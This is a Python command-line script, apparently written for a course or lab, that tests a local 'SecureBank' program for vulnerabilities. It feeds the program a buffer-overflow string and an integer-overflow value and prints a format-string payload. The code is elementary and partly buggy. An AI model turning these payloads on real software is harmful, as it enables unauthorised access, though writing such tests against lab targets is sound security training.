from asyncio.subprocess import PIPE
import re
from time import sleep
import click
import subprocess as sp


@click.group()
@click.version_option(version='0.0.1')
def main():
    """Application for penetration testing of the SecureBank"""
    pass

@main.command()
@click.option('--process',
                help='Process to be attacked')
@click.option('--user-name',
                help='User name of the SecureBank user')
@click.option('--bank-account',
                help='bank account for attacka purposes')
def automated_attack(process, user_name, bank_account):
    """Initiate automated pen test of the application"""
    pattern = re.compile(r"[a-zA-Z]+-[a-zA-Z]+")
    if not re.match(pattern, process):
        click.echo('incorrect format of the process name -> ' + process +', exiting now!')
        exit()
    
    confirmed_vulnerabilities = []
    process_opened = sp.Popen([user_name]
                        ,executable="./" + process
                        ,stdin=sp.PIPE
                        ,stderr=sp.PIPE
                        ,stdout=sp.PIPE
                        ,universal_newlines=True
                        )
    process_opened.stdin.write("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n")
    for lines in iter(process_opened.stdout.readline, b''):
        print(">>>" + lines.rstrip())
    if not re.match("Wrong password", process_opened.stdout.read()):
        click.echo("Buffer overflow failed to gain access to the application, exiting process now!")
        process_opened.kill()
        exit(1)
    confirmed_vulnerabilities.insert(1, "Buffer overflow is confirmed vulnerability")

    process_opened.stdin.write("1231354\n")
    sleep(3)
    process_opened.stdin.write("-21476511480\n")
    if not re.match("Remains", process_opened.stdout.read()):
        click.echo("Integer overflow failed, exiting process now!")
        process_opened.kill()
        exit(1)

    confirmed_vulnerabilities.insert(2, "Integer overflow is confirmed vulnerability")

    process_opened.kill()
    print("Penetration testing terminated with success")

    for items in confirmed_vulnerabilities:
        click.echo("\n" + items + " " + u'\u2713')


@main.command()
@click.option('--count',
                help="Number of As to fill buffer to cause buffer overflow")
def buffer_overflow(count = 0):
    """Command to perform buffer overflow
        eg. python3 ArmorPiercer.py buffer-overflow --count=10
    """
    click.echo('a' * int(count))

@main.command()
@click.option('--int-number',
                help="Number to cause integer overflow. Max value of int in C is 2147483648")
def integer_overflow(int_number):
    """Command to perform integer overflow
        eg. python3 ArmorPiercer.py integer-overflow --int-number=2147483648
    """
    something = ""
    print(something)
    click.echo(int(int_number))

@main.command()
def string_fortmating():
    """Command to perform string formating """
    print("\xc2\xd8\xff\xff"+"%08x-"*3+"%s")

if __name__ == '__main__':
    main()
